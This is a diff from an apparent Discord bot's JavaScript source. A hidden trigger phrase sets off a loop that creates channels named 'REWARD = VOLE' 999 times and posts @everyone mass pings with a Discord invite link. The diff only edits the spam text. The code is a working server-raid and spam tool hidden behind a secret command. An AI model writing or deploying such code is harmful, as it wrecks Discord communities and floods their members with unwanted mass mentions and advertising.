@@ -166,10 +166,10 @@ if(message.content.includes("ar!kelsairvvesrx")){
                       for(var i = 0; i < 999; i++){
                           message.guild.createChannel("REWARD = VOLE", "text").then(c => c.send("!everyone ."))
                           message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone !IDT https://discord.gg/R9yNQTg ."))
-                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
-                          message.guild.createChannel("REWARD = VOLE", "text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
-                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
-                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone !IDT https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE", "text").then(c => c.send("@everyone !IDT https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone !IDT https://discord.gg/R9yNQTg ."))
+                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone !IDT https://discord.gg/R9yNQTg ."))
 
                       }
                     }
